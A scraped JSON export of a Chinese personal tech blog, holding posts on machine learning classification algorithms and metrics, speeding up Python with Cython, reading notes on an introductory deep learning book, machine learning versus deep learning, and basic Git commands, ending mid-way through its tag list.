例如，你的垃圾邮件过滤器是一个机器学习程序，通过学习用户标记好的垃圾邮件和常规非垃圾邮件示例，它可以学会标记垃圾邮件。系统用于学习的示例称为训练集。在此案例中，任务（T）是标记新邮件是否为垃圾邮件，经验（E）是训练数据，性能度量（P） 需要定义。例如，你可以定义正确分类的电子邮件的比例为P。这种特殊的性能度量称为准确度，这是一种有监督的学习方法，常被用于分类任务。 监督学习在监督学习中，算法从有标记数据中学习。在理解数据之后，该算法通过将模式与未标记的新数据关联来确定应该给新数据赋哪种标签。 监督学习可以分为两类：分类和回归。 分类问题预测数据所属的类别； 分类的例子包括垃圾邮件检测、客户流失预测、情感分析、犬种检测等。 回归问题根据先前观察到的数据预测数值； 回归的例子包括房价预测、股价预测、身高-体重预测等。 分类问题分类是一种基于一个或多个自变量确定因变量所属类别的技术。 分类算法逻辑回归逻辑回归类似于线性回归，适用于因变量不是一个数值字的情况 (例如，一个“是/否”的响应)。它虽然被称为回归，但却是基于根据回归的分类，将因变量分为两类。 如上所述，逻辑回归用于预测二分类的输出。例如，如果信用卡公司构建一个模型来决定是否通过向客户的发行信用卡申请，它将预测客户的信用卡是否会“违约”。 首先对变量之间的关系进行线性回归以构建模型，分类的阈值假设为0.5。 然后将Logistic函数应用于回归分析，得到两类的概率。 该函数给出了事件发生和不发生概率的对数。最后，根据这两类中较高的概率对变量进行分类。 K-近邻算法（K-NN）K-NN算法是一种最简单的分类算法，通过识别被分成若干类的数据点，以预测新样本点的分类。K-NN是一种非参数的算法，是“懒惰学习”的著名代表，它根据相似性（如，距离函数）对新数据进行分类。 K-NN能很好地处理少量输入变量（p）的情况，但当输入量非常大时就会出现问题。 支持向量机（SVM）支持向量机既可用于回归也可用于分类。它基于定义决策边界的决策平面。决策平面（超平面）可将一组属于不同类的对象分离开。 在支持向量的帮助下，SVM通过寻找超平面进行分类，并使两个类之间的边界距离最大化。 SVM中超平面的学习是通过将问题转化为使用一些某种线性代数转换问题来完成的。（上图的例子是一个线性核，它在每个变量之间具有线性可分性）。 对于高维数据，使用可使用其他核函数，但高维数据不容易进行分类。具体方法将在之后阐述。 核支持向量机核支持向量机将核函数引入到SVM算法中，并将其转换为所需的形式，将数据映射到可分的高维空间。 核函数的类型包括： 前文讨论的就是线性SVM。 多项式核中需要指定多项式的次数。它允许在输入空间中使用曲线进行分割。 径向基核（radial basis function, RBF）可用于非线性可分变量。使用平方欧几里德距离，参数的典型值会导致过度拟合。sklearn中默认使用RBF。 类似于与逻辑回归类似，sigmoid核用于二分类问题。 径向基核（RBF：Radial Basis Function ）RBF核支持向量机的决策区域实际上也是一个线性决策区域。RBF核支持向量机的实际作用是构造特征的非线性组合，将样本映射到高维特征空间，再利用线性决策边界分离类。 因此，可以得出经验是：对线性问题使用线性支持向量机，对非线性问题使用非线性核函数，如RBF核函数。 朴素贝叶斯朴素贝叶斯分类器建立在贝叶斯定理的基础上，基于特征之间互相独立的假设（假定类中存在一个与任何其他特征无关的特征）。即使这些特征相互依赖，或者依赖于其他特征的存在，朴素贝叶斯算法都认为这些特征都是独立的。这样的假设过于理想，朴素贝叶斯因此而得名。 在朴素贝叶斯的基础上，高斯朴素贝叶斯根据二项（正态）分布对数据进行分类。 P(class|data) 表示给定特征（属性）后数据属于某类（目标）的后验概率。给定数据，其属于各类的概率大小就是我们要计算的值。 P(class)表示某类的先验概率。 P(data|class)表示似然，是指定类别时特征出现的概率。 P(data)表示特征或边际似然的先验概率。 步骤: 1、计算先验概率 P(class) = 类中数据点的数量/观测值的总数量 P(yellow) = 10/17 P(green) = 7/17 2、计算边际似然 P(data) = 与观测值相似的数据点的数量/观测值的总数量 P(?) = 4/17 该值用于检查各个概率。 3、计算似然 P(data/class) = 类中与观测值相似的数量/类中点的总数量 P(?/yellow) = 1/7 P(?/green) = 3/10 4、计算各类的后验概率 5、分类 某一点归于后验概率高的类别，因为从上可知其属于绿色类的概率是75%根据其75%的概率这个点属于绿色类。 多项式、伯努利朴素贝叶斯是计算概率的其他模型。朴素贝叶斯模型易于构建，不需要复杂的参数迭代估计，这使得它对非常大的数据集特别有用。 决策树分类决策树以树状结构构建分类或回归模型。它通过将数据集不断拆分为更小的子集来使决策树不断生长。最终长成具有决策节点（包括根节点和内部节点）和叶节点的树。最初决策树算法它采用采用Iterative Dichotomiser 3（ID3）算法来确定分裂节点的顺序。 信息熵和信息增益用于被用来构建决策树。 信息熵信息熵是衡量元素无序状态程度的一个指标，即衡量信息的不纯度。 信息熵是衡量元素的无序状态的程度的一个指标，或者说，衡量信息的不纯度。 直观上说地理解，信息熵表示一个事件的确定性程度。信息熵度量样本的同一性，如果样本全部属于同一类，则信息熵为0；如果样本等分成不同的类别，则信息熵为1。 信息增益信息增益测量独立属性间信息熵的变化。它试图估计每个属性本身包含的信息，构造决策树就是要找到具有最高信息增益的属性（即纯度最高的分支）。 信息增益测量独立属性间的信息熵的变化。它试图估计每个属性本身包含的信息，构造决策树就是要找到具有最高信息增益的属性（即纯度最高的分支）。 其中Gain（(T,X）)是特征X的信息增益。Entropy(T)是整个集合的信息熵，第二项Entropy(T,X)是特征X的信息熵。 采用信息熵进行节点选择时，通过对该节点各个属性信息增益进行排序，选择具有最高信息增益的属性作为划分节点，过滤掉其他属性。 决策树模型存在的一个问题是容易过拟合。因为在其决策树构建过程中试图通过生成长一棵完整的树来拟合训练集，因此却降低了测试集的准确性。 通过剪枝技术可以减少小决策树的过拟合问题。 分类的集成算法集成算法是一个模型组。从技术上说，集成算法是单独训练几个有监督模型，并将训练好的模型以不同的方式进行融合，从而达到最终的得预测结果。集成后的模型比其中任何一个单独的模型都有更高的预测能力。 随机森林分类器随机森林分类器是一种基于装袋（bagging）的集成算法，即自举助聚合法(bootstrap aggregation)。集成算法结合了多个相同或不同类型的算法来对对象进行分类（例如，SVM的集成，基于朴素贝叶斯的集成或基于决策树的集成）。 集成的基本思想是算法的组合提升了最终的结果。 深度太大的决策树容易受过拟合的影响。但是随机森林通过在随机子集上构建决策树防止过拟合，主要原因是它会对所有树的结果进行投票的结果是所有树的分类结果的投票，从而消除了单棵树的偏差。 随机森林在决策树生增长的同时为模型增加了额外的随机性。它在分割节点时，不是搜索全部样本最重要的特征，而是在随机特征子集中搜索最佳特征。这种方式使得决策树具有多样性，从而能够得到更好的模型。 梯度提升分类器梯度提升分类器是一种提升集成算法。提升(boosting)算法是为了减少偏差而对弱分类器的而进行的一种集成方法。与装袋（bagging）方法构建预测结果池不同，提升算法是一种分类器的串行方法，它把每个输出作为下一个分类器的输入。通常，在装袋算法中，每棵树在原始数据集的子集上并行训练，并用所有树预测结果的均值作为模型最终的预测结果；梯度提升模型，采用串行方式而非并行模式获得预测结果。每棵决策树预测前一棵决策树的误差，因而使误差获得提升。 使用浅层决策树初始化预测结果。 计算残差值（实际预测值）。 构建另一棵浅层决策树，将上一棵树的残差作为输入进行预测。 用新预测值和学习率的乘积作为最新预测结果，更新原有预测结果。 重复步骤2-4，进行一定次数的迭代（迭代的次数即为构建的决策树的个数）。 如果想了解更多关于梯度提升分类器的知识，可参考：https://medium.com/mlreview/gradient-boosting-from-scratch-1e317ae4587d%20/t%20_blank 分类器的性能混淆矩阵混淆矩阵是一张表，这张表通过对比已知分类结果的测试数据的预测值和真实值表来描述衡量分类器的性能。在二分类的情况下，混淆矩阵是展示预测值和真实值四种不同结果组合的表。 多分类问题的混淆矩阵可以帮助你确认错误模式。 对于二元分类器： 假正例&amp;假负例假正例和假负例用来衡量模型预测的分类效果。假正例是指模型错误地将负例预测为正例。假负例是指模型错误地将正例预测为负例。主对角线的值越大（主对角线为真正例和真负例），模型就越好；副对角线给出模型的最差预测结果。 假正例下面给出一个假正例的例子。比如：模型将一封邮件分类为垃圾邮件（正例），但这封邮件实际并不是垃圾邮件。这就像一个警示，错误如果能被修正就更好，但是与假负例相比，它并不是一个严重的问题。 作者注：个人观点，这个例子举的不太好，对垃圾邮件来说，相比于错误地将垃圾邮件分类为正常邮件（假负例），将正常邮件错误地分类为垃圾邮件（假正例）是更严重的问题。 假正例（I型错误）——原假设正确而拒绝原假设。 假负例假负例的一个例子。例如，该模型预测一封邮件不是垃圾邮件（负例），但实际上这封邮件是垃圾邮件。这就像一个危险的信号，错误应该被及早纠正，因为它比假正例更严重。 假负例（II型错误）——原假设错误而接受原假设。 上图能够很容易地说明上述指标。左图男士的测试结果是假正例因为男性不能怀孕；右图女士是假负例因为很明显她怀孕了。 从混淆矩阵，我们能计算出准确率、精度、召回率和F-1值。 准确率准确率是模型预测正确的部分。 准确率的公式为： 当数据集不平衡，也就是正样本和负样本的数量存在显著差异时，单独依靠准确率不能评价模型的性能。精度和召回率是衡量不平衡数据集的更好的指标。 精度精度是指在所有预测为正例的分类中，预测正确的程度为正例的效果。 精度越高越好。 召回率召回率是指在所有预测为正例（被正确预测为真的和没被正确预测但为真的）的分类样本中，召回率是指预测正确的程度。它，也被称为敏感度或真正率（TPR）。 召回率越高越好。 F-1值通常实用的做法是将精度和召回率合成一个指标F-1值更好用，特别是当你需要一种简单的方法来衡量两个分类器性能时。F-1值是精度和召回率的调和平均值。 普通的通常均值将所有的值平等对待，而调和平均值给予较低的值更高的权重，从而能够更多地惩罚极端值。所以，如果精度和召回率都很高，则分类器将得到很高的F-1值。 接受者操作曲线（ROC）和曲线下的面积（AUC）ROC曲线是衡量分类器性能的一个很重要指标，它代表模型准确预测的程度。ROC曲线通过绘制真正率和假正率的关系来衡量分类器的敏感度。如果分类器性能优越，则真正率将增加，曲线下的面积会接近于1.如果分类器类似于随机猜测，真正率将随假正率线性增加。AUC值越大，模型效果越好。 累积精度曲线CAP代表一个模型沿y轴为真正率的累积百分比与沿x轴的该分类样本累积百分比。CAP不同于接受者操作曲线（ROC，绘制的是真正率与假正率的关系）。与ROC曲线相比，CAP曲线很少使用。 以考虑一个预测客户是否会购买产品的模型为例，如果随机选择客户，他有50%的概率会购买产品。客户购买产品的累积数量会线性地增长到对应客户总量的最大值，这个曲线称为CAP随机曲线，为上图中的蓝色线。而一个完美的预测，准确地确定预测了哪些客户会购买产品，这样，在所有样本中只需选择最少的客户就能达到最大购买量。这在CAP曲线上产生了一条开始陡峭一旦达到最大值就会维持在1的折线，称为CAP的完美曲线，也被称为理想曲线，为上图中灰色的线。 最后，一个真实的模型应该能尽可能最大化地正确预测，接近于理想模型曲线。","link":"/2019/09/12/机器学习分类算法/"},{"title":"使用cython加速代码运行","text":"引入毫无疑问，Python是社区最喜爱的编程语言!到目前为止，它是最容易使用的语言之一，因为python代码是用一种直观的、人类可读的方式编写的。 然而，你经常会反复听到一些对Python的抱怨，尤其是来自C语言爱好者的抱怨，这些抱怨无非就是Python很慢。 是的，他们并没有说错。 与许多其他编程语言相比，Python确实很慢。Benchmark game有一些比较不同编程语言在不同任务上的速度的可靠基准。 https://benchmarksgame-team.pages.debian.net/benchmarksgame/fastest/gpp-python3.html?source=post_page 对于Python，我们有几种不同的方法可以加快速度: 1.使用多进程库来使用所有的CPU核心https://towardsdatascience.com/heres-how-you-can-get-a-2-6x-speed-up-on-your-data-pre-processing-with-python-847887e63be52.如果你使用Numpy、panda或Scikit-Learn，使用Rapids来加速GPU上的处理。https://towardsdatascience.com/heres-how-you-can-accelerate-your-data-science-on-gpu-4ecf99db3430 如果你所做的实际上可以并行化，比如数据预处理或矩阵运算，这些都是很好的方法。 但是如果你的代码是纯Python的呢?如果你不得不使用一个很大的for循环，且不能将数据放入矩阵中，因为数据必须按顺序处理，那会怎样?有没有办法加快Python本身的速度呢? 答案是肯定的，这就是Cython来加速原生Python代码的地方。 什么是Cython？Cython是Python和C/C++之间的一个中间步骤。它允许你编写纯Python代码，并且只需要做一些小修改，然后将其直接翻译成C代码。 你对Python代码所做的惟一调整就是向每个变量添加类型信息。通常，我们可以像这样在Python中声明一个变量: 1x = 5 使用Cython，我们将向该变量添加一个类型: 1cdef int x = 5 这告诉Cython，我们的变量是浮点类型，就像我们在C中所做的一样。对于纯Python，变量的类型是动态确定的。Cython中类型的显式声明使转换为C成为可能，因为显式类型声明是必须的。 安装Cython只需要一行简单的pip命令: 1pip install cython Cython中的类型使用Cython时，变量和函数分别有不同的类型。 对于变量我们有以下类型: cdef int a, b, c cdef char *s cdef float x = 0.5 (单精度) cdef double x = 63.4 (双精度) cdef list names cdef dict goals_for_each_play cdef object card_deck 注意所有这些类型都来自C/C++ ! 而对于方法我们有以下类型: def — 常规python函数，仅从python调用。 cdef — 不能从python的代码中访问Cython的函数。即必须在Cython内调用 cpdef — C 和 Python. 可以从C和Python中访问 了解了Cython类型之后，我们就可以直接实现加速了! 如何使用Cython加速python代码我们要做的第一件事是设置Python代码基准:用于计算数值阶乘的for循环。原生Python代码如下: 12345def test(x): y = 1 for i in range(x+1): y *= i return y 相同功能的Cython方法看起来非常相似。首先，我们将确保Cython代码文件具有.pyx扩展名。对代码本身的惟一更改是，我们已经声明了每个变量和函数的类型。 123456cpdef int test(int x): cdef int y = 1 cdef int i for i in range(x+1): y *= i return y Boom ! 可以看到我们的C代码已经编译好了，可以使用了! 你将看到，在Cython代码所在的文件夹中，你拥有运行C代码所需的所有文件，包括run_cython.c文件。如果你感兴趣，可以查看一下Cython生成的C代码! 现在我们准备测试我们新的并且超级快的C代码!查看下面的代码，它实现了一个速度测试，将原生Python代码与Cython代码进行比较。 123456789101112131415161718192021import run_pythonimport run_cythonimport timenumber = 10start = time.time()run_python.test(number)end = time.time()py_time = end - startprint(\"Python time = {}\".format(py_time))start = time.time()run_cython.test(number)end = time.time()cy_time = end - startprint(\"Cython time = {}\".format(cy_time))print(\"Speedup = {}\".format(py_time / cy_time)) 代码非常直观，我们以与普通Python相同的方式导入文件，并以与普通Python相同的方式运行函数! Cython几乎可以让你在所有原生Python代码上获得良好的加速，而不需要太多额外的工作。需要注意的关键是，循环次数越多，处理的数据越多，Cython可以提供的帮助就越多。 下表显示了Cython为不同的数值阶乘带来的加速性能。当数值为10000000的时候，可以看到，我们的Cython加速超过了36倍。 注意目前我的运行存在有 1DistutilsPlatformError: Unable to find vcvarsall.bat 错误,正在想办法解决,希望可以能尽快进入到一个c与python共存的世界 注意:该问题我已经解决，现在给出方法: 安装vsstudio2019，教程在:cython加速你的代码运行 参考文章:cython加速python使用 我运行的代码源文件:下载 使用笔记","link":"/2019/09/10/使用cython加速代码运行/"},{"title":"《深度学习入门》阅读笔记","text":"第1章 Python入门1.5.4 Numpy的N维数组12345import numpy as npa = np.array([[1,2],[3,4]])b = np.array([[3,0],[0,6]])print(a+b)print(a*b) 注意:数学上，一维数组称为向量；二维数组称为矩阵；可以将一般化后的向量或矩阵等统称为张量。 1.5.5 广播1234import numpy as npa = np.array([[1,2],[3,4]])b = np.array([10,20])print(a*b) 1.6.3 显示图像12345import matplotlib.pyplot as pltfrom matplotlib.image import imreadimg = imread('图片名称')plt.imshow(img)plt.show() 第2章 感知机感知机是神经网络(深度学习)的起源算法。 2.3.3 使用权重和偏置的实现权重值是控制输入信号的重要参数；偏置值调整了神经元被激活的容易程度。 2.4.2 线性和非线性单层感知机的局限性在于它只能表示由一条直线分割的区间。 2.5.2 异或门的实现叠加了多层的感知机称为多层感知机。 感知机的层数叫法问题。 2.6 从与非门到计算机实际上，使用感知机甚至可以表示计算机！ 第3章 神经网络当拥有感知机的同时我们也知道了两个消息： 好消息：对于复杂的函数，感知机也能通过叠加层数来有可能性的实现。 坏消息是：设定权重的工作在感知机中仍只能是由人工进行的。 而神经网络的出现就是为了解决来自感知机的坏消息。 3.1.3 激活函数登场激活函数的作用在于决定如何来激活输入信号的总和。 3.2 激活函数阶跃函数：函数以阈值为界，一旦输入超过阈值，就切换输出。 实际上，如果将激活函数从阶跃函数换成其他函数，我们就可以进入到神经网络的世界了。 3.2.5 sigmiod函数和阶跃函数的比较sigmoid函数是一条平滑的曲线，输出随着输入发生连续性变化；而阶跃函数以0为界，输出发生急剧性的变化。sigmoid函数的平滑性对神经网络的学习具有重要的意义。 也就是说，相对于感知机中的神经元只能返回0或1的信号，神经网络中返回的是连续的实数值信号。 相同点 两者的图像结构均表示为：“输入小时，输出接近0（为0）；输入大时，随着输入的增大，输出靠近1（为1）”。 不管输入的大小为多少，输出信号的值始终在0到1之间。 均为非线性函数。 不同点 阶跃函数：“竹筒敲石”。 sigmoid函数：“水车”。 3.2.6 非线性函数输出值为输入值的常数倍的函数称为线性函数。 为了发挥叠加层的优势，神经网络必须使用非线性函数。 3.5 输出层的设计神经网络可以使用在分类和回归问题上，不过需要根据情况改变输出层的激活函数 ，一般而言，回归问题用恒等函数，分类问题用softmax函数。 softmax函数python实现： 12345def softmax(a): exp_a = np.exp(a) sum_exp_a = np.sum(exp_a) y = exp_a / sum_exp_a return y 3.5.2 使用softmax函数时的注意事项softmax函数的分子进行了指数的运算，可能会产生一些超大值，如果这些超大值进行除法运算，会出现”不确定”的情况，这就是产生了溢出问题。 改进的softmax函数python实现： 123456def softmax(a): c = np.max(a) exp_a = np.exp(a - c) sum_exp_a = np.sum(exp_a) y = exp_a / sum_exp_a return y 3.5.4 输出层的神经元数量输出层的神经元数量需要根据需要解决的问题来决定。对于分类问题，输出层的神经元的数量一般设为类别的数量。 第4章 神经网络的学习“学习”是指从训练数据中自动获取最优权重参数的过程。 4.1.1 数据驱动对于一个数字“5”的识别，我们可以采用一些方法来识别： 人暴力想出一个算法识别，得出答案。-人参与 人想到特征量（如一个横，一个类似s构成了5），然后采用机器学习（SVM，KNN）得出答案。-人参与 神经网络（深度学习）利用数据学习，机器自己识别判断。-完全机器 深度学习也被称为端到端的机器学习。 神经网络的优点是对所有问题都可以采用同样的流程来解决，不管解决的是识别数字还是人脸，神经网络都是通过不断的学习所提供的数据，尝试发现待解决的问题。 4.1.2 训练数据和测试数据 训练数据：也称监督数据，用来训练新的模型的数据。 测试数据：为了检验模型的泛化能力。 泛化能力指处理未被观察过的数据（不包含在训练数据中的数据）的能力。 获得泛化能力是机器学习的最终目标。 4.4.1 梯度法根据寻找最小值还是最大值，寻找最小值的梯度法称为梯度下降法，寻找最大值的梯度法称为梯度上升法。但是通过反转损失函数的符号，求最大和最小值会变成相同的问题，所以一般来说，神经网络（深度学习）中，梯度法指的是梯度下降法。 第5章 误差反向传播法5.4 简单层的实现Affine层是负责矩阵乘积的。 第6章 与学习相关的技巧6.1.3 SGD的缺点为了改正SGD的缺点，我们可以使用优化算法Momentum，AdaGrad，Adam等。 第7章 卷积神经网络第8章 深度学习","link":"/2019/09/07/《深度学习入门》阅读笔记/"},{"title":"机器学习VS深度学习的区别","text":"本文我们主要涉及到: 数据相关性 硬件依赖性 特征工程 解决问题方法 执行时间 可解释性 1.数据的相关性深度学习与传统机器学习最重要的区别是，随着数据量的增加，其性能也随之提高。当数据很小的时候，深度学习算法并不能很好地执行，这是因为深度学习算法需要大量的数据才能完全理解它。下图便能很好的说明这个事实：从上图我们可以看到，随着数据量的增大，深度学习的性能会越来越好，而传统机器学习方法性能表现却趋于平缓；但传统的机器学习算法在数据量较小的情况下，比深度学习有着更好的表现。 2.硬件的依赖性深度学习算法在很大程度上依赖于高端机器，而传统的机器学习算法可以在低端机器上工作。这是因为深度学习算法对GPU有较高的要求，GPU是其工作的一个组成部分。因为深度学习算法要固有地执行大量的矩阵乘法运算，而使用GPU可以有效地优化这些操作，这就免不了对GPU的依赖。而相比之下，机器学习算法对硬件配置没有很高的要求。 3.特征工程特征工程是将领域知识应用到特征抽取的创建过程，以降低数据的复杂性为目的。但这一过程在训练时间和如何提取特征方面十分地困难。 在机器学习中，大多数应用的特征需要由专家识别，然后根据域和数据类型手工编码。 例如，特征可以是像素值、形状、纹理、位置和方向，大多数机器学习算法的性能取决于特征识别和提取的准确程度。 而深度学习算法则试图从数据中学习更高级的特性。这是深度学习一个非常独特的部分，也是有别于传统机器学习的一部分。因此，深度学习减少了为每个问题开发新的特征抽取的任务，而是像卷积神经网络（CNN）这样尝试学习低层次的特征，如：早期层次的边缘和线条，然后是人脸的一部分，最后才是人脸的高层次表示。这样的方式相较于机器学习，在训练时间和成本上有较高的提升。 4.解决问题方法在使用传统的机器学习算法解决问题时，通常的做法是将问题分解成不同的部分，然后单独解决，最后结合起来得到结果。相比之下，深度学习更提倡端到端地解决问题。让我们举个例子来理解这一点。如图所示是一个多对象检测任务，我们的目标是哟啊确定对象是什么以及它在图像中的位置。 在典型的机器学习方法中，我们会将问题分为两个步骤：对象检测和对象识别。首先，我们将使用一个边界检测算法，如：GrabCut，来浏览图像并找到图像中所有可能的对象；然后，在所有已识别的对象中，我们再使用对象识别算法（如：SVM）来识别相关对象，最后再判断对象的位置。 不同于传统机器学习算法，在深度学习的方法中，我们将进行端到端的学习过程。例如，使用YOLO算法（一种深度学习算法）。我们往YOLO网络中传入一张图像，它将给出对象的具体位置和名称。是不是方便了很多呢？ 5.执行时间通常，深度学习算法需要很长的时间来训练，这是因为在深度学习算法中有太多的参数，所以训练这些参数的时间比平时要长。即使比较先进的深度学习算法Resnet，从零开始完全训练也需要大约两周的时间。相比之下，机器学习所需的训练时间要少得多，从几秒钟到几个小时不等。 相较于训练时间，测试时间就要短很多。在测试时，深度学习算法的运行时间要短得多。但是，如果将其与k近邻机器学习算法进行比较，测试时间会随着数据大小的增加而增加。但这并不适用于所有机器学习算法，因为其中一些算法的测试时间也很短。 6.可解释性最后，我们将可解释性作为比较机器学习和深度学习的一个因素。这一因素也是深度学习难以在工业中取得大规模应用的主要原因。 我们举个例子：假设我们使用深度学习为论文自动评分，它在得分方面的表现相当出色，接近于人类的表现。但有一个问题：深度学习并没有揭示它为什么会给出那个分数。事实上，从数学中我们可以发现深度神经网络的哪些节点被激活，但是我们不知道神经元应该做什模型以及这些神经元层共同在做什么，所以我们无法对结果进解释。 而相较于深度学习，类似于决策树这样的机器学习算法为我们提供了清晰的规则，告诉我们什么是它的选择以及为什么选择了它，很容易解释算法背后的推理。因此，决策树和线性/逻辑回归等机器学习算法主要用于工业中需要可解释性的场景。","link":"/2019/09/05/机器学习VS深度学习的区别/"},{"title":"Git操作","text":"一.Git简介Git 是一种分布式版本控制系统，它可以不受网络连接的限制，加上其它众多优点，目前已经成为程序开发人员做项目版本管理时的首选，非开发人员也可以用 Git 来做自己的文档版本管理工具。 Git 的api很多，但其实平时项目中90%的需求都只需要用到几个基本的功能即可，所以本文将从实用主和深入探索(后期更新)2个方面去谈谈如何在项目中使用 Git，一般来说，看完实用主义这一节就可以开始在项目中动手用。 说明：本文的操作都是基于Windows系统 二.实用主义1.准备阶段 工具准备 进入 Git官网下载合适你的安装包。 账号准备 进入Github网站 注册一个账号就可以使用了。 2.常用操作所谓实用主义，就是掌握了以下知识就可以玩转 Git，轻松应对90%以上的需求。以下是实用主义型的Git命令列表，先大致看一下: git clone git config git branch git checkout git status git add git commit git push git pull git log git tag (1)git clone 从git服务器拉取代码 1git clone https://github.com/user/repo.git (2)git config 配置开发者用户名和邮箱 12git config user.name usergit config user.email user@qq.com (3)git branch 创建、重命名、查看、删除项目分支，通过Git做项目开发时，一般都是在开发分支中进行，开发完成后合并分支到主干。 1git branch daily/0.0.0 创建一个名为daily/0.0.0的日常开发分支，分支名只要不包括特殊字符即可。 1git branch -m daily/0.0.0 daily/0.0.1 如果觉得之前的分支名不合适，可以为新建的分支重命名，重命名分支名为daily/0.0.1。 1git branch 通过不带参数的branch命令可以查看当前项目分支列表。 1git branch -d daily/0.0.1 如果分支已经完成使命则可以通过-d参数将分支删除，这里为了继续下一步操作，暂不执行删除操作。 (4)git checkout 切换分支 1git checkout daily/0.0.1 (5)git status 查看文件变动状态通过任何你喜欢的编辑器对项目中的 README.md 文件做一些改动，保存。 1git status 通过git status命令可以看到文件当前状态Changes not staged for commit:(改动文件未提交到暂存区） 123456On branch daily/0.0.1Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: README.mdno changes added to commit (use \"git add\" and/or \"git commit -a\") (6)git add 添加文件变动到暂存区 1git add README.md 通过指定文件名README.md可以将该文件添加到暂存区，如果想添加所有文件可用git add. 命令，这时候可通过git status看到文件当前状态Changes to be committed:（文件已提交到暂存区） 1234On branch daily/0.0.1Changes to be committed: (use \"git reset HEAD &lt;file&gt;...\" to unstage) modified: README.md (7)git commit 提交文件变动到版本库 1git commit -m '这里写提交原因' 通过-m参数可直接在命令行里输入提交描述文本。 (8)git push 将本地的代码改动推送到服务器 1git push origin daily/0.0.1 origin 指代的是当前的git服务器地址，这行命令的意思是把 daily/0.0.1 分支推送到服务器，当看到命令行返回如下字符表示推送成功了。 12345678Counting objects: 3, done.Delta compression using up to 8 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (3/3), 267 bytes | 0 bytes/s, done.Total 3 (delta 1), reused 0 (delta 0)remote: Resolving deltas: 100% (1/1), completed with 1 local objects.To https://github.com/gafish/gafish.github.com.git * [new branch] daily/0.0.1 -&gt; daily/0.0.1 现在我们回到Github网站的项目首页，点击Branch:master下拉按钮，就会看到刚才推送的daily/00.1分支了。 (9)git pull 将服务器上的最新代码拉取到本地 1git pull origin daily/0.0.1 如果其它项目成员对项目做了改动并推送到服务器，我们需要将最新的改动更新到本地，这里我们来模拟一下这种情况。 进入Github网站的项目首页，再进入daily/0.0.1分支，在线对README.md文件做一些修改并保存，然后在命令中执行以上命令，它将把刚才在线修改的部分拉取到本地，用编辑器打开README.md，你会发现文件已经跟线上的内容同步了。 如果线上代码做了变动，而你本地的代码也有变动，拉取的代码就有可能会跟你本地的改动冲突，一般情况下Git会自动处理这种冲突合并，但如果改动的是同一行，那就需要手动来合并代码，编辑文件，保存最新的改动，再通过git add .和git commit -m ‘xxx’来提交合并。 (10)git log 查看版本提交记录 1git log 通过以上命令，我们可以查看整个项目的版本提交记录，它里面包含了提交人、日期、提交原因等信息，得到的结果如下： 123456789commit c334730f8dba5096c54c8ac04fdc2b31ede7107aAuthor: gafish &lt;gafish@qqqq.com&gt;Date: Wed Jan 11 09:44:13 2017 +0800 Update README.mdcommit ba6e3d21fcb1c87a718d2a73cdd11261eb672b2aAuthor: gafish &lt;gafish@qqqq.com&gt;Date: Wed Jan 11 09:31:33 2017 +0800 test..... 提交记录可能会非常多，按J键往下翻，按K键往上翻，按Q键退出查看。 (11)git tag 为项目标记里程碑 12git tag publish/0.0.1git push origin publish/0.0.1 当我们完成某个功能需求准备发布上线时，应该将此次完整的项目代码做个标记，并将这个标记好的版本发布到线上，这里我们以publish/0.0.1为标记名并发布，当看到命令行返回如下内容则表示发布成功了。 123Total 0 (delta 0), reused 0 (delta 0)To https://github.com/gafish/gafish.github.com.git * [new tag] publish/0.0.1 -&gt; publish/0.0.1 (12).gitignore 设置哪些内容不需要推送到服务器，这是一个配置文件 1touch .gitignore .gitignore 不是Git命令，而在项目中的一个文件，通过设置.gitignore的内容告诉Git哪些文件应该被忽略不需要推送到服务器，通过以上命令可以创建一个.gitignore文件，并在编辑器中打开文件，每一行代表一个要忽略的文件或目录，如： 12demo.htmlbuild/ 以上内容的意思是Git将忽略demo.html文件 和build/目录，这些内容不会被推送到服务器上。 小结 通过掌握以上这些基本命令就可以在项目中开始用起来了，如果追求实用，那关于Git的学习就可以到此结束了，偶尔遇到的问题也基本上通过Google/百度也能找到答案。","link":"/2019/09/04/Git操作/"}],"tags":[{"name":"学习资料","slug":"学习资料","link":"/tags/学习资料/"},{"name":"Github Pages","slug":"Github-Pages","link":"/tags/Github-Pages/"},{"name":"Intellij Idea安装","slug":"Intellij-Idea安装","link":"/tags/Intellij-Idea安装/"},{"name":"机器学习","slug":"机器学习","link":"/tags/机器学习/"},{"name":"深度学习","slug":"深度学习","link":"/tags/深度学习/"},{"name":"Git常用操作","slug":"Git常用操作","link":"/tags/Git常用操作/"},{"name":"LaTex安装使用","slug":"LaTex安装使用","link":"/tags/LaTex安装使用/"},{"name":"抠图","slug":"抠图","link":"/tags/抠图/"},{"name":"1024快乐","slug":"1024快乐","link":"/tags/1024快乐/"},{"name":"Jupyter拓展","slug":"Jupyter拓展","link":"/tags/Jupyter拓展/"},{"name":"爱5分析","slug":"爱5分析","link":"/tags/爱5分析/"},{"name":"导库","slug":"导库","link":"/tags/导库/"},{"name":"迷宫","slug":"迷宫","link":"/tags/迷宫/"},{"name":"生命游戏","slug":"生命游戏","link":"/tags/生命游戏/"},{"name":"pytorch张量","slug":"pytorch张量","link":"/tags/pytorch张量/"},{"name":"pytorch","slug":"pytorch","link":"/tags/pytorch/"},{"name":"python常用包","slug":"python常用包","link":"/tags/python常用包/"},{"name":"Anaconda","slug":"Anaconda","link":"/tags/Anaconda/"},{"name":"matplotlib","slug":"matplotlib","link":"/tags/matplotlib/"},{"name":"数学基础","slug":"数学基础","link":"/tags/数学基础/"},{"name":"Simple Game","slug":"Simple-Game","link":"/tags/Simple-Game/"},{"name":"cython","slug":"cython","link":"/tags/cython/"},{"name":"内网穿透工具","slug":"内网穿透工具","link":"/tags/内网穿透工具/"},{"name":"显卡","slug":"显卡","link":"/tags/显卡/"},{"name":"概率分布","slug":"概率分布","link":"/tags/概率分布/"},{"name":"周志华论文","slug":"周志华论文","link":"/tags/周志华论文/"},{"name":"k-means算法","slug":"k-means算法","link":"/tags/k-means算法/"},{"name":"好玩命令","slug":"好玩命令","link":"/tags/好玩命令/"},{"name":"python常用代码","slug":"python常用代码","link":"/tags/python常用代码/"},{"name":"学生信息管理系统","slug":"学生信息管理系统","link":"/tags/学生信息管理系统/"},{"name":"开源协议","slug":"开源协议","link":"/tags/开源协议/"},{"name":"代码加密","slug":"代码加密","link":"/tags/代码加密/"},{"name":"排序","slug":"排序","link":"/tags/排序/"},{"name":"数据集-推荐系统","slug":"数据集-推荐系统","link":"/tags/数据集-推荐系统/"},{"name":"高级搜索